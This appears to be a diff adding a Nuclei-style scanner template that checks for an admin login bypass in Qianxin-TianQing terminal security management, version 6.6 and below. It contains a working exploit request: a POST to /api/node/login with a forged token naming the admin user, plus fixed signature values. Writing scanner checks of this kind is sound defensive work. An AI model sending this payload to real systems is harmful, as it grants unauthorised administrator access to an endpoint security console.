@@ -1,0 +1,29 @@
+id: qianxin-tianqing-login-bypass
+info:
+  name: 360 SkyRock Terminal Security Management System Admin Login Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The login interface in Qianxin-TianQing version 6.6 and below is vulnerable to a login bypass vulnerability, allowing attackers to log in as an administrator.
+  tags: permission-bypass
+  metadata:
+    product: Qianxin-TianQing
+    version: "<=6.6"
+http:
+  - raw:
+      - |
+        POST /api/node/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=eyJob3N0IjoiMTI3LjAuMC4xIiwidCI6IjE2NDg1OTg5MDgiLCJmcm9tX3VzZXIiOiJhZG1pbiIsImZyb21fcG9ydCI6IjgwIiwiZnJvbV9pcCI6IjEyNy4wLjAuMSJ9&sign=24074ff81a6f17a220423b4acde0ad8c&enp=1bea7b44f4917cffe3fa13be406b6910
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "admin"
